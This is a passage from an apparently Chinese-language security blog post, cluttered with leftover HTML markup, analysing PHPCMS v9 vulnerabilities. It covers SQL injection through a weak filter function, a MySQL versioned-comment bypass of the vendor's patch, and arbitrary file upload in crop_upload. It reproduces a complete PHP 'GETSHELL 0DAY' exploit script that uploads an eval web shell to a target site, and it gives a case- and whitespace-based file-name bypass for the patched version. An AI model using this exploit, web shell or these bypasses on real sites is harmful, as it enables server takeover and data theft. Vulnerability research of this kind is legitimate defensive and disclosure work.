$value = ’</code>’.trim($value).’<code>’;
}
return $value;
}&lt;/pre&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;上边过滤函数没有有效过滤&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;2.&lt;span style=&quot;font-family:宋体;&quot;&gt;生日修改注入&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;漏洞函数&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;pre class=&quot;brush:php; toolbar: true; auto-links: true;&quot;&gt;/phpcms/modules/member/index.php
public function account_manage_info() {
if(isset($_POST[’dosubmit’])) {
 //更新用户昵称
$nickname = isset($_POST[’nickname’]) &amp;amp;&amp;amp; trim($_POST[’nickname’]) ? trim($_POST[’nickname’]) : ’’;
if($nickname) {
$this-&amp;gt;db-&amp;gt;update(array(’nickname’=&amp;gt;$nickname), array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’]));
     if(!isset($cookietime)) {
      $get_cookietime = param::get_cookie(’cookietime’);
     }
     $_cookietime = $cookietime ? intval($cookietime) : ($get_cookietime ? $get_cookietime : 0);
     $cookietime = $_cookietime ? TIME + $_cookietime : 0;
     param::set_cookie(’_nickname’, $nickname, $cookietime);
 }
 require_once CACHE_MODEL_PATH.’member_input.class.php’;
 require_once CACHE_MODEL_PATH.’member_update.class.php’;
 $member_input = new member_input($this-&amp;gt;memberinfo[’modelid’]);
 $modelinfo = $member_input-&amp;gt;get($_POST[’info’]);//数据传入get函数，经过get函数对注入语句无影响
 $this-&amp;gt;db-&amp;gt;set_model($this-&amp;gt;memberinfo[’modelid’]);
 $membermodelinfo = $this-&amp;gt;db-&amp;gt;get_one(array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’]));
 if(!empty($membermodelinfo)) {
     $this-&amp;gt;db-&amp;gt;update($modelinfo, array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’])); //进入sql语句形成注入
 } else {
     $modelinfo[’userid’] = $this-&amp;gt;memberinfo[’userid’];
     $this-&amp;gt;db-&amp;gt;insert($modelinfo);
 }
Mysql.class.php文件
public function update($data, $table, $where = ’’) {
if($table == ’’ or $where == ’’) {
return false;
}
$where = ’ WHERE ’.$where;
$field = ’’;
if(is_string($data) &amp;amp;&amp;amp; $data != ’’) {
$field = $data;
} elseif (is_array($data) &amp;amp;&amp;amp; count($data) &amp;gt; 0) {
$fields = array();
foreach($data as $k=&amp;gt;$v) {
switch (substr($v, 0, 2)) {
case ’+=’:
$v = substr($v,2);
if (is_numeric($v)) {
$fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’+’.$this-&amp;gt;escape_string($v, ’’, false);
} else {
continue;
}
break;
case ’-=’:
$v = substr($v,2);
if (is_numeric($v)) {
$fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’-’.$this-&amp;gt;escape_string($v, ’’, false);
} else {continue;}
break;
default:
$fields[] = $this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;escape_string($v);
}
}
$field = implode(’,’, $fields);
} else {
return false;
}
$sql = ’UPDATE</code>’.$this-&gt;config[’database’].’<code>.</code>’.$table.’<code>SET ’.$field.$where;
return $this-&amp;gt;execute($sql);
}&lt;/pre&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;可以清楚的看出又是使用的&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;add_special_char&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;函数过滤哦。所以其实这两个注入都是利用的程序设计的同一个&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;bug&lt;span style=&quot;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;0x02&amp;nbsp;&lt;span style=&quot;font-family:宋体;&quot;&gt;绕过厂商的补丁&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;当让漏洞被发现者上报&lt;span style=&quot;font-family:’Times New Roman’;&quot;&gt;wooyun&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;后厂商也做了相应的补丁，厂商也找到了漏洞的根源也就是：&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:’Times New Roman’;&quot;&gt;public&amp;nbsp;function&amp;nbsp;add_special_char(&amp;amp;$value)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;函数&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;补丁后函数如下：&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;

&lt;pre class=&quot;brush:php; toolbar: true; auto-links: true;&quot;&gt;public function add_special_char(&amp;amp;$value) {
 if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’</code>’)) {<br> //不处理包含&amp;#42 或者 使用了sql方法。<br> } else {<br>     $value = ’<code>’.trim($value).’</code>’;<br> }<br> if (preg_match(“/(select|insert|update|delete)/i”, $value)) {<br>     $value = preg_replace(“/(select|insert|update|delete)/i”, ’’, $value);<br> }<br> return $value;<br> }</pre><br><br><span style="font-size:10.5pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">很明显厂商直接做了过滤：</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:’Times New Roman’;">$value&nbsp;=&nbsp;preg_replace(“/(select|insert|update|delete)/i”,&nbsp;’’,&nbsp;$value);</span><span style="font-size:10.5pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">看着这个可能有人会猜测</span><span style="font-size:10.5pt;font-family:宋体;">selselectect<span style="font-family:宋体;">是不是可以绕过呢，答案是否的。大家可以看到有个</span><span style="font-family:’Times New Roman’;"></span><span style="font-family:宋体;">，这个为整词匹配，也就是说如果你是</span><span style="font-family:’Times New Roman’;">selselectect</span><span style="font-family:宋体;">，这个为一个完整的词，用这个完整的词去匹配，不会单独拿这个词的一部分去匹配，因此经过匹配仍然是</span><span style="font-family:’Times New Roman’;">selselecctect</span><span style="font-family:宋体;">。</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">那我们怎么绕过呢？</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">/&amp;#42!50000select&amp;#42/<span style="font-family:宋体;">这个就是答案了，首先作为一个整词</span><span style="font-family:’Times New Roman’;">50000select</span><span style="font-family:宋体;">是不会被正则掉的，其次使用</span><span style="font-family:’Times New Roman’;">/&amp;#42!&amp;#42/</span><span style="font-family:宋体;">这个特殊的</span><span style="font-family:’Times New Roman’;">mysql</span><span style="font-family:宋体;">的特性使得</span><span style="font-family:’Times New Roman’;">select</span><span style="font-family:宋体;">的作用不变，完整的绕过了补丁。</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">从上文提到的两个注入可以看出这个过滤函数是非常重要的，如果这个过滤函数被绕过了，注入漏洞也许不止上文中的两个吧！</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">破不开的密码</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上文提到了注入，我们也只是得到了当前的数据库操作权限（数据库权限大，可以跨库之类的就另当别论了）。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">当然我们有了注入读取管理员进入后台，然后后台<span style="font-family:’Times New Roman’;">getwebshell</span><span style="font-family:宋体;">这个是一般思路，但是</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的加密是加有</span><span style="font-family:’Times New Roman’;">salt</span><span style="font-family:宋体;">的和</span><span style="font-family:’Times New Roman’;">dz</span><span style="font-family:宋体;">加密一样，使之破解难度非常大。以前写过一个</span><span style="font-family:’Times New Roman’;">php</span><span style="font-family:宋体;">破解脚本，单线程效率灰常低，有兴趣了可以看下。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">    </span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;color:#ff0000;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><a href="http://lanu.sinaapp.com/PHP_study/89.html" target="_blank" rel="noopener">http://lanu.sinaapp.com/PHP_study/89.html</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">密码破不开只能看看有没有什么前台</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">getwebshell<span style="font-family:宋体;">之类的了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x04&nbsp;<span style="font-family:宋体;">曾经的</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">漏洞文件：<span style="font-family:’Times New Roman’;">phpcmsmodulesattachmentattachments.php</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">漏洞函数：<span style="font-family:’Times New Roman’;">crop_upload</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {<br>$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];//这里可以得知，图片内容由POST控制<br>//中间省略十万行<br>if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {<br>$file = $<em>GET[’file’];<br>$basename = basename($file);<br>if (strpos($basename, ’thumb</em>’)!==false) {<br>$file_arr = explode(’_’, $basename);<br>$basename = array_pop($file_arr);<br>}<br>$new_file = ’thumb_’.$width.’<em>’.$height.’</em>’.$basename;<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">//<span style="font-family:宋体;">中间省略十万行</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">file_put_contents($this-&gt;upload_path.$filepath.$new_file,&nbsp;$pic);</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">//<span style="font-family:宋体;">上面可见，文件名</span><span style="font-family:’Times New Roman’;">$basename</span><span style="font-family:宋体;">可控，图片内容可控，还有什么不能做？？</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">}</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上面这段代码是截取</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">wooyun<span style="font-family:宋体;">上的，时间太久了没有找到当时漏洞版本的程序。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">网上也有相应的<span style="font-family:’Times New Roman’;">exp</span><span style="font-family:宋体;">：</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php<br>error_reporting(E_ERROR);<br>set_time_limit(0);<br>$pass=”wooyun.in”;<br>print_r(’<br>+—————————————————————————+<br>PHPCms V9 GETSHELL 0DAY<br>c0de by testr00ttest<br>针对iis6.0的漏洞 有点鸡肋 但是也可以用<br>apache 是老版本可能会产生问题<br>+—————————————————————————+<br>’);<br>echo ’密码为’.$pass;<br>if ($argc &lt; 2) {<br>print_r(’<br>+—————————————————————————+<br>Usage: php ’.$argv[0].’ url [js]<br>js 类型配置  1为asp 2为php  3为apache 的版本<br>Example:<br>php ’.$argv[0].’ <a href="http://www.wooyun.in" target="_blank" rel="noopener">www.wooyun.in</a> 1<br>+—————————————————————————+<br>’);<br>exit;<br>}<br>$url=$argv[1];<br>$js=$argv[2];//写入脚本类型 wooyun.in<br>$phpshell=’&lt;?php @eval($_POST[’’.$pass.’’]);?&gt;’;<br>$aspshell=’&lt;%eval request(“’.$pass.’”)%&gt;’;<br>if($js==1){<br>        $file=”1.asp;1.jpg”;<br>         $ret=GetShell($url,$aspshell,$file);<br>}else if($js==2){<br>        $file=”1.php;1.jpg”;<br>        $ret=GetShell($url,$phpshell,$file);<br>}else if($js==3){<br>        $file=”1.php.jpg”;<br>        $ret=GetShell($url,$phpshell,$file);<br>}else{<br>        print_r(’没有选择脚本类型’);<br>}<br>$pattern = “|http://[^,]+?.jpg,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0]){<br>        echo “<br>url地址:”.$matches[0][0];<br>}else{<br>        echo “<br>没得到！”;<br>}<br>function GetShell($url,$shell,$js){<br>        $content =$shell;<br>        $data = “POST /index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=1&amp;height=1&amp;file=http://“.$url.”/uploadfile/“.$js.” HTTP/1.1<br>“;<br>        $data .= “Host: “.$url.”<br>“;<br>        $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>        $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>        $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>        $data .= “Connection: close<br>“;<br>        $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>        $data .= $content.”<br>“;<br>        //echo $data;<br>        $ock=fsockopen($url,80);<br>        if (!$ock) {<br>        echo “  No response from “.$url.”<br>“;<br>        }<br>        fwrite($ock,$data);<br>        $resp = ’’;<br>        while (!feof($ock)) {<br>               $resp.=fread($ock, 1024);<br>       }<br>       return $resp;<br>}<br>?&gt;</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">可以看出基本都是利用的</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">web<span style="font-family:宋体;">容器的解析漏洞，时间过了这么久了，厂商补丁应该是打上了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">我在最新的<span style="font-family:’Times New Roman’;">phpcms</span><span style="font-family:宋体;">中使用这个</span><span style="font-family:’Times New Roman’;">exp</span><span style="font-family:宋体;">，没有成功。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x05&nbsp;<span style="font-family:宋体;">补漏了</span><span style="font-family:’Times New Roman’;">apache</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">补丁已打，但却依然不是那么完善。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最新程序：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">    </span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function crop_upload() {<br>if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {<br>$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];<br>if (isset($_GET[’width’]) &amp;&amp; !empty($_GET[’width’])) {<br>$width = intval($_GET[’width’]);<br>}<br>if (isset($_GET[’height’]) &amp;&amp; !empty($_GET[’height’])) {<br>$height = intval($_GET[’height’]);<br>}<br>if (isset($_GET[’file’]) &amp;&amp; !empty($_GET[’file’])) {<br>$_GET[’file’] = str_replace(’;’,’’,$_GET[’file’]);//过滤了fen号<br>if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();//is_image()检测是个关键<br>if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {<br>$file = $<em>GET[’file’];<br>$basename = basename($file);//获取带有后缀的文件名<br>if (strpos($basename, ’thumb</em>’)!==false) {<br>$file_arr = explode(’_’, $basename);<br>$basename = array_pop($file_arr);<br>}<br>$new_file = ’thumb_’.$width.’<em>’.$height.’</em>’.$basename;<br>} else {<br>pc_base::load_sys_class(’attachment’,’’,0);<br>$module = trim($_GET[’module’]);<br>$catid = intval($_GET[’catid’]);<br>$siteid = $this-&gt;get_siteid();<br>$attachment = new attachment($module, $catid, $siteid);<br>$uploadedfile[’filename’] = basename($_GET[’file’]);<br>$uploadedfile[’fileext’] = fileext($_GET[’file’]);<br>if (in_array($uploadedfile[’fileext’], array(’jpg’, ’gif’, ’jpeg’, ’png’, ’bmp’))) {<br>$uploadedfile[’isimage’] = 1;<br>}<br>$file_path = $this-&gt;upload_path.date(’Y/md/’);<br>pc_base::load_sys_func(’dir’);<br>dir_create($file_path);<br>$new_file = date(’Ymdhis’).rand(100, 999).’.’.$uploadedfile[’fileext’];<br>$uploadedfile[’filepath’] = date(’Y/md/’).$new_file;<br>$aid = $attachment-&gt;add($uploadedfile);<br>}<br>$filepath = date(’Y/md/’);<br>file_put_contents($this-&gt;upload_path.$filepath.$new_file, $pic);<br>} else {<br>return false;<br>}<br>echo pc_base::load_config(’system’, ’upload_url’).$filepath.$new_file;<br>exit;<br>}<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">后缀检测：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">phpcmsmodulesattachmentfunctionsglobal.func.php<br>function is_image($file) {<br>$ext_arr = array(’jpg’,’gif’,’png’,’bmp’,’jpeg’,’tiff’);<br>$ext = fileext($file);关键地方<br>return in_array($ext,$ext_arr) ? $ext_arr :false;<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">关键函数</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">:</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">function fileext($filename) {<br>return strtolower(trim(substr(strrchr($filename, ’.’), 1, 10)));<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">Fileext<span style="font-family:宋体;">函数是对文件后缀名的提取。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">根据此函数我们如果上传文件名为</span><span style="mso-spacerun:’yes’;color:#ff0000;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">ddd.Php.jpg%20%20%20%20%20%20%20Php</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">经过此函数提取到的后缀还是<span style="font-family:’Times New Roman’;">jpg</span><span style="font-family:宋体;">，因此正在</span><span style="font-family:’Times New Roman’;">is_image()</span><span style="font-family:宋体;">函数中后缀检测被绕过了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">我们回到</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">public&nbsp;function&nbsp;crop_upload()&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">函数中</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">在经过了</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">is_image<span style="font-family:宋体;">的判断之后又来了个</span><span style="font-family:’Times New Roman’;">.php</span><span style="font-family:宋体;">的判断，在此程序员使用的是</span><span style="font-family:’Times New Roman’;">strpos</span><span style="font-family:宋体;">函数</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">这个函数是对大小写敏感的函数我们使用<span style="font-family:’Times New Roman’;">.Php</span><span style="font-family:宋体;">就可以直接绕过了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">经过上边的两层的过滤我们的<span style="font-family:’Times New Roman’;">ddd.Php.jpg%20%20%20%20%20%20%20Php</span><span style="font-family:宋体;">后缀依然有效。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最后<span style="font-family:’Times New Roman’;">$basename</span><span style="font-family:宋体;">变量的值就为</span><span style="font-family:’Times New Roman’;">ddd.Php.jpg%20%20%20%20%20%20%20Php&nbsp;</span><span style="font-family:宋体;">然后使用</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">file_put_contents</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">函数写入到了指定目录。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">看见</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">ddd.Php.jpg%20%20%20%20%20%20%20Php<span style="font-family:宋体;">这个后缀，大家应该明白了，它用在</span><span style="font-family:’Times New Roman’;">apache</span><span style="font-family:宋体;">搭建的服务器上可以被解析。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x06&nbsp;Exp</span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">l</span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">oit<span style="font-family:宋体;">编写</span></span><span 